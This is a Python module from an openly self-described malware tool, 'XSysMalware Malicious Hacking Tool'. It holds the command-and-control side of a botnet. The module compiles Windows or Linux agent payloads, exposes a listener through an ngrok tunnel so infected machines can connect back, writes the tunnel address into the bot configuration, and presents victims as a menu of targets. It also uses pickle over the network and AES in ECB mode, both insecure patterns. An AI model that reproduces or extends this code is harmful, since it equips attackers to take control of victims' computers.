import os
import string
import sys
import platform
import json
import pickle
import time
import random
import hashlib
from string import punctuation, whitespace, ascii_letters
import wget
from pyngrok import ngrok, conf
from socket import socket, error, timeout, AF_INET, SOCK_STREAM
from typing import Any
from dataclasses import dataclass, asdict
from base64 import b64encode, b64decode
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES


class Singleton(type):
    instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls.instances:
            cls.instances[cls] = cls
        return cls


class CryptoUtils(object, metaclass=Singleton):
    new = lambda s: AES.new(s.encode(), AES.MODE_ECB)
    encode_aes = lambda c, s: c.encrypt(pad(b64encode(s if isinstance(s, bytes) else s.encode()), AES.block_size))
    decode_aes = lambda c, e: b64decode(unpad(c.decrypt(e if isinstance(e, bytes) else e.encode()), AES.block_size)).decode()


class Config(object, metaclass=Singleton):
    DevPath = False

    @staticmethod
    def get_downloads_dir(): return Config.resource_path("sessions")

    @staticmethod
    def is_windows():
        if platform.platform().lower().startswith('win'):
            return True
        return False

    @staticmethod
    def remove_dir(path):
        if os.path.exists(path):
            os.remove(path)
            return True
        return False

    @staticmethod
    def get_payload(payload_type):
        if Config.is_windows() and payload_type == 1:
            return Config.resource_path("dist\\agent.exe")
        elif not Config.is_windows() and payload_type == 2:
            return Config.resource_path("dist/agent")
        return False

    @staticmethod
    def get_ngrok_binary():
        if Config.is_windows():
            if Config.DevPath:
                binary = Config.resource_path('bin/win/ngrok.exe')
            else:
                binary = Config.resource_path('dist/server/_internal/bin/win/ngrok.exe')
        elif platform.platform().lower().startswith('lin'):
            if Config.DevPath:
                binary = Config.resource_path('bin/lin/ngrok')
            else:
                binary = Config.resource_path('dist/server/_internal/bin/lin/ngrok')
        else:
            if Config.DevPath:
                binary = Config.resource_path('bin/mac/ngrok')
            else:
                binary = Config.resource_path('dist/server/_internal/bin/mac/ngrok')
        return binary

    @staticmethod
    def resource_path(relative_path):
        """ Get absolute path to resource, works for dev and for PyInstaller """
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
            Config.DevPath = False
        else:
            base_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..')
            Config.DevPath = True
        return os.path.abspath(os.path.join(base_path, relative_path))

    @staticmethod
    def get_config_path():
        return Config.resource_path('config.json')

    @staticmethod
    def get_bot_config():
        return Config.resource_path('bot.json')

    @staticmethod
    def get_agent_spec():
        return Config.resource_path('agent.spec')

    @staticmethod
    def get_project_root():
        return Config.resource_path('.')

    @staticmethod
    def load_config(service=None):
        if not service:
            config_json = Config.resource_path('config.json')
        else:
            config_json = Config.resource_path('bot.json')
        with open(config_json, 'r') as stream:
            data = json.load(stream)
            stream.close()
        return data


class BotnetInterface(object):
    """
    class: BotnetInterface (object)
    this class represents the scope interface of which a BOTNET network
    interacts according to Admins class requirements.
    """
    incoming = None
    outgoing = None
    tunnel = None
    config = None

    def __init__(self, insocket: socket = None, outsocket: socket = None, self_type: str = None):
        if isinstance(insocket, socket):
            self.incoming = insocket
        else:
            self.incoming = socket()

        if isinstance(outsocket, socket):
            self.outgoing = outsocket
        else:
            self.outgoing = socket()
        self.config = Config.load_config(self_type)

    @staticmethod
    def download_ngrok_binaries():
        if platform.platform().lower().startswith('win'):
            file_path = NgrokManager.download_windows_binary()
        elif platform.platform().lower().startswith('lin'):
            file_path = NgrokManager.download_linux_binary()
        else:
            file_path = NgrokManager.download_mac_binary()
        return file_path

    def populate(self): self.config = Config.load_config('bot')

    def distribute(self):
        bin_path = Config.get_ngrok_binary()
        tunnel = self.config.get('tunnel')
        incoming = self.config.get('incoming')
        pyngrok_config = conf.PyngrokConfig(ngrok_path=bin_path)
        self.tunnel = ngrok.connect(incoming.get('port'), tunnel.get('proto'), pyngrok_config=pyngrok_config)
        with open(Config.get_config_path(), 'r') as stream_read:
            config_data = json.load(stream_read)
            url, port = self.__strip_schema()
            config_data.get('tunnel')['url'] = url
            config_data.get('tunnel')['port'] = int(port)
            with open(Config.get_config_path(), 'w') as stream_write:
                stream_write.write(json.dumps(config_data))
                stream_write.close()
            stream_read.close()
        self.config = Config.load_config()
        with open(Config.get_bot_config(), 'w') as stream_write:
            data = json.dumps({
                "tunnel": self.config.get("tunnel"),
                "settings": self.config.get("settings")
            })
            stream_write.write(data)
            stream_write.close()

    def accept(self): return self.incoming.accept()

    def connect(self, _address: tuple):
        try:
            self.outgoing.connect(_address)
        except error as e:
            return e
        return True

    def bind(self, _address: tuple): self.incoming.bind(_address)

    def listen(self, _backlog: int): self.incoming.listen(_backlog)

    def send(self, data: Any, connection=None):
        connection = self.outgoing if not connection else connection
        data = pickle.dumps(data)
        connection.sendall(data)

    def receive(self, connection=None):
        connection = self.outgoing if not connection else connection
        data = b''
        pkt = connection.recv(self.config.get('settings').get('buffer'))
        while pkt:
            data += pkt
            if data != b'':
                break
            pkt = connection.recv(self.config.get('settings').get('buffer'))
        data = pickle.loads(data)
        return data

    def __strip_schema(self): return self.tunnel.public_url.split('://').pop().split(':')


@dataclass
class Envelope(object):
    """
    class: Envelope (object)
    this class represents the data structure for
    which a socket endpoint transmit among the Flux Network.
    """
    Id: str
    DataText: str

    def __init__(self, data=None):
        self.Id = hex(id(data))
        self.DataText = data

    def __repr__(self):
        return '<Envelope %r>' % asdict(self)


@dataclass
class Peer(object):
    """
    class: Peer (object)
    this class represents the connection data for
    which a socket is connected to an endpoint.
    """
    Id: str
    Socket: socket
    Address: tuple
    online: bool

    def __init__(self, peer_id=None, peer=None, address=None, online=False):
        self.Id = peer_id
        self.Socket = peer
        self.Address = address
        self.online = online

    def __repr__(self):
        return '<Peer %r>' % asdict(self)


class Menu(object, metaclass=Singleton):
    @staticmethod
    def payload_section():
        print("\n[INFO] Which Target OS Payload should we Compile?\n")
        print("[1] Windows")
        print("[2] Linux")
        print("[0] Exit XSYS-Malware")
        return int(input("[ALERT] Select Choice: "))

    @staticmethod
    def startup_section():
        print("\n[Main Menu]\n")
        print("[1] Compile & Serve")
        print("[2] Run Session")
        print("[0] Exit")
        return int(input("[ALERT] Select Choice: "))

    @staticmethod
    def clear_console():
        os.system('cls') if platform.platform().lower().startswith('win') else os.system('clear')

    @staticmethod
    def welcome():
        Menu.clear_console()
        print('\n')
        print('''
[==================================================]
[  Welcome To XSysMalware  Malicious Hacking Tool  ]
[==================================================] 
[               Version Alpha 1.0.0-1              ]
[  ----------------------------------------------  ] 
[            Created -by- T0x1cEnv31ope            ]   
[==================================================]''')

    @staticmethod
    def refresh_connections_list(connection: dict):
        Menu.clear_console()
        print('''[==================================================]
[    Listing all available connections in pool     ] 
[==================================================]
[#]============[REMOTE ADDRESS]============[PEER ID]''')
        for i, (key, peer) in enumerate(connection.items()):
            peer_id = peer.Id or key
            ip, port = peer.Address
            print('[%d]             %s:%d            %s' % ((i+1), ip, port, peer_id[:8]))
        return Menu.choose_from_connections(connection)

    @staticmethod
    def choose_from_connections(connections: dict):
        if len(connections.keys()) == 0:
            print('[!] No connections!')
            time.sleep(5)
            return
        else:
            print('\n--------\n[!] Enter `0` to exit')
            choice = input('[$] select a  target:\n ')
            if choice in [punctuation, whitespace, ascii_letters]:
                print('[!] unsupported choice %s' % choice)
                time.sleep(5)
                return Menu.refresh_connections_list(connections)
            elif choice == '0':
                return
            else:
                try:
                    choice = connections.get(list(connections.keys())[int(choice) - 1])
                except IndexError:
                    print('[!] target id  %d doesn\'t exists!')
                    time.sleep(5)
                    return Menu.refresh_connections_list(connections)
        return choice

    @staticmethod
    def refresh(self):
        print("\n")
        print("[*] ngrok tunnel %s is running" % self.interface.tunnel.public_url)
        print("[*] tcp socket is online")
        print('[*] waiting for incoming connections (up to %d)\n' % self.config.get('incoming').get('backlog'))


class NgrokManager:

    @staticmethod
    def download_windows_binary():
        wget.download(
            url='https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip',
            out=Config.resource_path('bin/win')
        )
        return Config.resource_path('bin/win/ngrok-v3-stable-windows-amd64.zip')

    @staticmethod
    def download_mac_binary():
        wget.download(
            url='https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip',
            out=Config.resource_path('bin/mac')
        )
        return Config.resource_path('bin/mac/ngrok-v3-stable-darwin-amd64.zip')

    @staticmethod
    def download_linux_binary():
        wget.download(
            url='https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz',
            out=Config.resource_path('bin/lin')
        )
        return Config.resource_path('bin/lin/ngrok-v3-stable-linux-amd64.tgz')